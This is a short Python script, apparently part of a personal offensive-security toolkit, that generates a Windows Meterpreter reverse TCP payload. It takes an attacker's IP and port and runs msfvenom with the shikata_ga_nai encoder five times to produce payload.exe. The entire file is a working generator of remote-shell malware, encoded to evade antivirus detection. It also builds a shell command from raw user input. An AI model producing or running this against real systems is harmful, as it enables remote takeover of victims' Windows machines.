"""
@Description 	: Generate basic payloads
@Author		: Ginsu
@Date		: 6/16/22
@Version	: 1.0
"""

### Imports
import subprocess as sp
###

__all__ = ["msf_basic"]

### Code
def msf_basic():
	print("Mini MSF Payload Generator")
	print("--------------------------")
	print("(1) Basic Windows Reverse TCP")
	op = int(input("\nOption: "))
	ip = input("IP: ")
	port = input("Port: ")
	if op == 1:
		cmd_str = "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe --encoder x86/shikata_ga_nai -i 5 -o payload.exe".format(ip, port)
	try:
		sp.call(cmd_str, shell=True)
		print("[+] Done.")
	except:
		print("[-] Fail.")
###

if __name__ == "__main__":
	msf_basic()
